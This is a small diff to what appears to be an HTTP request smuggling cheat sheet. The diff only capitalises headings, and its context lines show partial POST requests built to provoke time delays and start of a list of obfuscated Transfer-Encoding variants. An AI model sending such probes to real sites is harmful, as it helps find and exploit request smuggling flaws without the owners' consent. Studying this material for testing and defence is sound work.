@@ -1,4 +1,4 @@
-### if a time delay occurs the site might be vulnerable
+### If a time delay occurs the site might be vulnerable
 ```
 POST / HTTP/1.1
 Host: <domain>
@@ -10,7 +10,7 @@ Z
 Q  
 ```
 
-### again provoce time delay
+### Again provoce time delay
 ```
 POST / HTTP/1.1
 Host: <domain>
@@ -23,7 +23,7 @@ X
 ```
 
 
-### some different chung encoding templates:
+### Some different chung encoding templates:
 ```
 Transfer-Encoding: xchunked
 
